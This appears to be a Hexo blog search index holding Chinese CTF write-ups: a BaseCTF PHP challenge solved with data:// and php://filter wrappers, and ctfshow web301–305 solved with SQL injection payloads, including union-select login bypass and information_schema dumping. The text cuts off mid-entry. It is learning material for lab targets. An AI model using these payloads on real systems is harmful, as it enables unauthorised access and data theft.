<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BaseCTF2024-web</title>
      <link href="/2024/08/18/BaseCTF2024-web/"/>
      <url>/2024/08/18/BaseCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Aura 酱，欢迎回家~ </span><span class="token comment">// 这里有一份礼物，请你签收一下哟~ </span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~ </span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ </span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p><strong>file_get_contents()</strong></p><p>语法：file_get_contents(path,include_path,context,start,max_length)</p><p>该函数是用于把文件的内容读入到一个字符串里的方法。</p><p>这个函数绕过方式有多种：</p><p><strong>php:&#x2F;&#x2F;input伪协议绕过</strong></p><ol><li>将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input</li><li>用post方法传入想要file_get_contents()函数返回的值</li></ol><p><strong>data:&#x2F;&#x2F;伪协议绕过</strong></p><ol><li>?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码</li><li>?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</li></ol><p>这里因为是POST传参所以采用data</p><p>strpos函数是返回需要查找的字符串在目标字符串的位置，这里要求为0，意味着必须在开头出现</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io</span></code></pre><p>第三个绕过需要用<code>file_get_contents</code>传入<code>challenge</code>变量，这里考点为<code>file_get_contents</code>本来的用法，以及url跳转</p><p>本页面就有<strong>已经收到Kengwang的礼物啦</strong>的字样</p><p>所以传入<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657/</code>即可绕过</p><p>最后就是一个简单的文件包含</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-代码审计</title>
      <link href="/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="web301-310"><a href="#web301-310" class="headerlink" title="web301-310"></a>web301-310</h3><h4 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>没有任何过滤</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php">修改的地方：<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>按照同样逻辑构造即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// string(32) "d9c77c4e454869d5d8da3b4be79694d3"</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span><span class="token string single-quoted-string">' union select '</span>d9c77c4e454869d5d8da3b4be79694d3' <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h4><p>checklogin.php限制了userid的长度</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>fun.php和sds_user.sql给了弱密码提示 <code>admin/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 27151b7b1ad51a38ea66b1529cde5ee4</span><span class="token delimiter important">?></span></span># sds_user.sql-- ------------------------------ Records of sds_user-- ----------------------------INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');</code></pre><pre class="language-php" data-language="php"><code class="language-php"># dptadd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//注入点</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$dpt_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_address</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_build_year</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_has_cert</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"on"</span><span class="token operator">?</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token variable">$dpt_cert_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into sds_dpt set sds_name='"</span><span class="token operator">.</span><span class="token variable">$dpt_name</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_address ='"</span><span class="token operator">.</span><span class="token variable">$dpt_address</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_build_date='"</span><span class="token operator">.</span><span class="token variable">$dpt_build_year</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_have_safe_card='"</span><span class="token operator">.</span><span class="token variable">$dpt_has_cert</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_safe_card_num='"</span><span class="token operator">.</span><span class="token variable">$dpt_cert_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_telephone='"</span><span class="token operator">.</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:dpt.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>首先访问apt.php可以新增表单，新增后抓包进行sql注入</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/dptadd.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gd7ltvs2a269115fvk9s234121</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Dnt</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show/dpt.php</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">204</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>dpt_name=1&amp;dpt_address=1&amp;dpt_build_year=2024-08-01&amp;dpt_has_cert=on&amp;dpt_cert_number=a',sds_telephone=(Payload);%23&amp;dpt_telephone_number=a</code></pre><p>Payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查表名  sds_dpt,sds_fl9g,sds_user</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 查列名  flag</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'sds_fl9g'</span><span class="token comment"># getFlag </span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token string">'sds_fl9g'</span></code></pre><p><img src="web303.png" loading="lazy"></p><h4 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h4><p>Hint:</p><p>增加了全局waf</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|-/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>但是其实没有上waf。只是换了个表名，把<code>sds_fl9g</code>换成了<code>sds_flaag</code>而已。其他都同上题。</p><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> sds_flaag</code></pre><h4 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 